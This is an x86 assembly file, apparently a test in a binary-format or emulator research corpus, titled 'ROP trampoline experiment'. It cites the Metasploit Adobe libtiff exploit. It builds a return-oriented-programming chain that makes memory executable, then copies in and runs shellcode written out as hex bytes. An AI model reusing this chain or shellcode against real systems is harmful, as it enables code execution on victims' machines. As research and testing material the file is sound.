; ROP trampoline experiment
; from http://www.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/fileformat/adobe_libtiff.rb

%include '../../onesec.hdr'
res dt 0
EntryPoint:
    push trampo
        pop esp
    retn

_pop_eax__ret:
    pop eax
    ret

_pop_ecx__ret:
    pop ecx
    ret

_mov_eax_mECX__ret:
    mov eax, [ecx]
    ret

_mov_mEAX_ECX__ret:
    mov [eax], ecx
    ret

_mov_mECX_eax__xor_eax_eax__ret:
    mov [ecx], eax
    xor eax, eax
    ret

_call_mEAX__ret_:
    call [eax]
    ret

pop_esi__add_esp_14__ret:
    pop esi
    add esp, 14h
    ret

_mov_eax_m_ebp_24h__ret:
    mov eax, [ebp - 24h]
    ret

_add_eax_4__ret:
    add eax, 4
    ret

_call_eax_:
    call eax

_KiFastSystemCall equ 07ffe0300h

%macro mov_eax 1
    dd _pop_eax__ret, %1
%endmacro

%macro mov_ecx 1
    dd _pop_ecx__ret, %1
%endmacro

%macro mov_mem 2
    mov_eax %1
    mov_ecx %2
    dd _mov_mEAX_ECX__ret
%endmacro

%macro mov_eax_mem 1
    mov_ecx %1
    dd _mov_eax_mECX__ret
%endmacro

trampo:

    mov_mem 010104h, 01000h
    mov_eax_mem _KiFastSystemCall


    dd _pop_eax__ret,
    dd 010104h,
    dd _pop_ecx__ret,
    dd 01000h,
    dd _mov_mEAX_ECX__ret,

    dd _pop_ecx__ret,
    dd _KiFastSystemCall,
    dd _mov_eax_mECX__ret,

    dd _pop_ecx__ret,
    dd 010011h,
    dd _mov_mECX_eax__xor_eax_eax__ret,
    dd _pop_ecx__ret,
    dd 010100h,
    dd _mov_mECX_eax__xor_eax_eax__ret,
    dd _pop_eax__ret,
    dd 010011h,
    dd _call_mEAX__ret_,
    dd pop_esi__add_esp_14__ret,
    dd 0ffffffffh,
    dd 010100h,
    dd 00,
    dd 010104h,
    dd 01000h,
    dd 040h,
    ; The next bit effectively copies data from the interleaved stack to the memory
    ; pointed to by eax
    ; The data copied is:
    ; \x5a\x52\x6a\x02\x58\xcd\x2e\x3c\xf4\x74\x5a\x05\xb8\x49\x49\x2a
    ; \x00\x8b\xfa\xaf\x75\xea\x87\xfe\xeb\x0a\x5f\xb9\xe0\x03\x00\x00
    ; \xf3\xa5\xeb\x09\xe8\xf1\xff\xff\xff\x90\x90\x90\xff\xff\xff\x90
    dd _mov_eax_m_ebp_24h__ret,
    dd _pop_ecx__ret,
    dd 026a525ah,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 03c2ecd58h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0f4745a05h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 02a4949b8h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0affa8b00h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0fe87ea75h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0b95f0aebh,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 03e0h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 09eba5f3h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0fffff1e8h,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 0909090ffh,
    dd _mov_mEAX_ECX__ret,
    dd _add_eax_4__ret,
    dd _pop_ecx__ret,
    dd 090ffffffh,
    dd _mov_mEAX_ECX__ret,
    dd _mov_eax_m_ebp_24h__ret,
    dd _call_eax_,


    jmp good
%include '..\goodbad.inc'

;%IMPORT user32.dll!MessageBoxA
;%IMPORT kernel32.dll!ExitProcess

;%IMPORTS

SECTION0SIZE equ $ - Section0Start
SIZEOFIMAGE equ $ - IMAGEBASE
